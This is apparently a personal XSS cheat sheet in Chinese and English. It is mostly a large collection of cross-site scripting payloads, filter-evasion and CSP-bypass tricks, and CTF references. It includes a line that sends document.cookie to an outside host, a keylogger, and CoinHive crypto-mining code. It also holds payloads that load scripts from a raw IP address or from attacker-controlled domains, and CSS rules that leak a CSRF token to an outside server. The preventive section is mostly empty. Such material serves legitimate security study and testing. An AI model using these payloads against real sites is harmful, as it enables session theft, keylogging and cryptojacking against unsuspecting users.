# XSS(Crossing Site Scripting)
[TOC]
###### tags: `Security` `Web`

# Online Resources
[GitHub AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
[OWASP XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

## Tools
* [monyer Encoding / Decoding](http://monyer.com/demo/monyerjs/)
* [JSFuck](http://www.jsfuck.com/)

## Challenges
* [Cure53 XSS](https://github.com/cure53/XSSChallengeWiki/wiki)
* [xss.shift-js.info](http://xss.shift-js.info/)
* [prompt.ml/0](http://prompt.ml/0)

# Types
## Reflected XSS
直接輸出使用者的輸入內容
```
echo "Your input:" . $_GET["q"];
/?q=<script>alert(1)</script>
```
## Stored XSS
保存在資料庫中，常見於留言板等等
## DOM XSS
最大的差別是 DOM XSS 的內容不會傳到 Server 端
JavaScript 在處理 DOM Tree 時，導致的 XSS
例如 fragment (在`#`後面) 不會傳到 Server
```
eval(location.hash.substr(1));
index.html#alert(1)
```
[URL fragment allowed characters](https://stackoverflow.com/questions/26088849/url-fragment-allowed-characters)

- #### Popular Sources
    * document.URL
    * document.documentURI
    * location.hash.substr(1)
    * location.href
    * location.search
    * location.*
    * window.name
    * document.referrer
- #### Popular Sinks
	* HTML Modification sinks
        * document.write
        * (element).innerHTML
	* HTML modification to behaviour change
        * (element).src (in certain elements)
	* Execution Related sinks
        * eval
        * setTimout / setInterval
        * execScript
## mXSS, UXSS, XSSI, Electron XSS to RCE


# Exploit Advantage
## Steal cookie
```javascript
fetch("http://wildfoo.tw/?x="+btoa(document.cookie));
```
## Key logger
```javascript
document.onkeypress = function(e) {
    console.log(e.key);
}
```
## Mining
```javascript
var miner = new CoinHive.User('SITE_KEY', 'WildfootW');
miner.start();
```
* 截圖
* 動態生成釣魚頁面
* 持久化 XSS - 安裝 Service Worker


# Payloads
[tomnomnom - alert.js](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)
## Basic Payload

- `<script>alert(1)</script>`
- `<svg/onload=alert(1)>`
- `<img src=# onerror=alert(1)>`
- `<a href="javascript:alert(1)">g</a>`
- `<input type="text" value="g" onmouseover="alert(1)" />`
- `<iframe src="javascript:alert(1)"></iframe>`
- `<iframe sRc=\/wIldFoO.tW>`

## Testing

- `<script>alert(1)</script>`
- `'"><script>alert(1)</script>`
- `<img/src=@ onerror=alert(1)/>`
- `'"><img/src=@ onerror=alert(1)/>`
- `' onmouseover=alert(1) x='`
- `" onmouseover=alert(1) x="`
- ``` `onmouseover=alert(1) x=` ```
- `javascript:alert(1)//`

## 一些alert(document.domain)的方法
- `(alert)(document.domain);`
- `al\u0065rt(document.domain);`
- `al\u{65}rt(document.domain);`
- `window['alert'](document.domain);`
- `alert.call(null,document.domain);`
- `alert.bind()(document.domain);`

## Some Payload
- `<svg/onload=alert(1);alert(2)>`
- `<svg/onload="alert(1);alert(2)">`
- `<svg/onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;;alert(2)">`
    - `;;`改成`;`會失敗
    - 雙引號可去掉
    - 可10進位, 16進位混合
- `<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>`
    - \u形式只能用在javascript，例如onload的a改成\u0061會失敗
- `<title><a href="</title><svg/onload=alert(1)>`
    - title優先權較大，直接中斷其他標籤
- `<svg><script>prompt&#40;1)</script>`
    - 因為`<svg>`，HTML Entities會被解析
    - 去掉`<svg>`會失敗，`<script>`不會解析Entities
- `<? foo="><script>alert(1)</script>">`
- `<! foo="><script>alert(1)</script>">`
- `</ foo="><script>alert(1)</script>">`
- `<% foo="><script>alert(1)</script>">`
- `([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ア+=ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ア](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()` [katakana.js](https://github.com/aemkei/katakana.js)

## Remote Script
* `<script src="https://184.75.249.44/import.js"></script>`
* `<svg onload=PAYLOAD>` [BRUTE XSS](https://brutelogic.com.br/blog/calling-remote-script-with-event-handlers/)
    * `"var x=new XMLHttpRequest();x.open('GET','//0');x.send(); x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"`
    * `fetch('//0').then(r=>{r.text().then(w=>{write(w)})})`
    * `with(top)body.appendChild (createElement('script')).src='//0'`
    * `$.get('//0',r=>{write(r)})`
    * `$.getScript('//0')`
    
## Polyglot XSS
在各種地方都可以運作的 payload
[GitHub Wiki](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

# Bypass
[只用五種字元的 JavaScript](https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-10)
## JavaScript ES6 features
```javascript
alert`1`
eval.call`${'alert\x281)'}
```

## 算術運算符
`//` (註解) 被過濾時，可以利用算數運算符代替
```htmlmixed
<a href="javascript:alert(1)-abcde">xss</a>
```
## HTML features
- 不分大小寫
    - `<ScRipT>`
    - `<img SrC=#>`
- 屬性值
    - `src="#"`
    - `src='#'`
    - `src=#`
    - ```src=`#` ``` (IE)

## Encoding
Javascript自解碼機制
`<input type="button" onclick="document.write('&lt;img src=@ onerror=alert(1) /&gt;')" />`會成功`alert(1)`，因為javascript位於HTML中，在執行javascript前會先解碼HTML編碼，但若是包在`<script>`中的javascript，不會解碼HTML編碼
- HTML Entity `&entity_name;` z.B. `&lt;`
- Hex Code (分號可去掉)
```
<svg/onload=alert(1)>
<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```
- Decimal Code
```
&#;
```

## Bypass Whitespace
- `<img/src='1'/onerror=alert(0)>`

## Double Encoding
[OWASP page](https://www.owasp.org/index.php/Double_Encoding)
``` ? -> %3f -> %253f ```

# Knowledges
- 特殊標籤
    - 以下標籤中的腳本無法執行
    - `<title>`, `<textarea>`, `<iframe>`, `<plaintext>`, `<noscript>`...

- 偽協議
    - javascript:
        - `<a href=javascript:alert(1) >xss</a>`
    - data:
        - `<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>xss</a>`

- Javascript中有三套編碼/解碼函數
    - escape/unescape
    - encodeURI/decodeURI
    - encodeURIComponent/decodeURICompinent

- fetch
    即使 `fetch` 會遇到 SOP 問題，但還是會送出 request
    ![](https://i.imgur.com/rqWZqrN.png)
    ![](https://i.imgur.com/JH9vOzR.png)


# Preventive measures
## Escaping Output

## Validating Input

## XSS Auditor / Filter (Browser)
[MDN docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)
Header: `X-XSS-Protection`

## CSP (Content Security Policy) (Browser)
### CSP evaluator

https://csp-evaluator.withgoogle.com/

### Bypass CSP

- base
    - 改變資源載入的域，引入惡意的js
    - `<base href ="http://kaibro.tw/">`
    - RCTF 2018 - rBlog

- script nonce
    
    ```
     <p>可控內容<p>
     <script src="xxx" nonce="AAAAAAAAAAA"></script>
    ```

    插入`<script src="http//kaibro.tw/uccu.js" a="`

    ```
     <p><script src="http//kaibro.tw/uccu.js" a="<p>
     <script src="xxx" nonce="AAAAAAAAAAA"></script>
    ```

- Script Gadget
    - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
    - is an **existing** JS code on the page that may be used to bypass mitigations
    - Bypassing CSP strict-dynamic via Bootstrap
        - `<div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'></div>`
    - Bypassing sanitizers via jQuery Mobile
        - `<div data-role=popup id='--><script>alert(1)</script>'></div>`
    - Bypassing NoScript via Closure (DOM clobbering)
        - `<a id=CLOSURE_BASE_PATH href=http://attacker/xss></a>`
    - Bypassing ModSecurity CRS via Dojo Toolkit
        - `<div data-dojo-type="dijit/Declaration" data-dojo-props="}-alert(1)-{">`
    - Bypassing CSP unsafe-eval via underscore templates
        - `<div type=underscore/template> <% alert(1) %> </div>`
    - 0CTF 2018 - h4xors.club2
- google analytics ea
    - ea is used to log actions and can contain arbitrary string
    - Google CTF 2018 - gcalc2


# Other
## aaencode / aadecode
- http://utf-8.jp/public/aaencode.html
- https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html


## RPO
- http://example.com/a%2findex.php
    - 瀏覽器會把`a%2findex.php`當成一個檔案
    - Web Server則會正常解析成`a/index.php`
    - 所以當使用**相對路徑**載入css時，就可以透過這種方式讓瀏覽器解析到其他層目錄下的檔案
        - 如果該檔案內容可控，則有機會XSS
    - 舉例： 
        - `/test.php`中有`<link href="1/" ...>`
        - 另有`/1/index.php`給`?query=`參數，會直接輸出該參數內容
        - 訪問`/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php`就會讓背景變紅色
            - Server: `/test.php`
            - Browser: `/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php`
                - CSS會載入`/1/?query={}*{background-color:red}/../../1/`
            - CSS語法容錯率很高

## Markdown XSS
- `[a](javascript:prompt(document.cookie))`
- `[a](j a v a s c r i p t:prompt(document.cookie))`
- `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`
- `[a](javascript:window.onerror=alert;throw%201)`

## 文件XSS
- Example: PlaidCTF 2018 wave XSS
- 上傳.wave檔 (會檢查signatures)
  ```
    RIFF`....WAVE...` 
    alert(1); 
    function RIFF(){}
  ```
    - 變成合法的js語法
    - wave在apache mime type中沒有被定義
    - `<script src="uploads/this_file.wave">`

## CSS Injection
- CSS可控時，可以Leak Information
- Example:
    - leak `<input type='hidden' name='csrf' value='2e3d04bf...'>`
    - `input[name=csrf][value^="2"]{background: url(http://kaibro.tw/2)}`
    - `input[name=csrf][value^="2e"]{background: url(http://kaibro.tw/2e)}`
    - ...
    - SECCON CTF 2018 - GhostKingdom
    
https://github.com/s0md3v/AwesomeXSS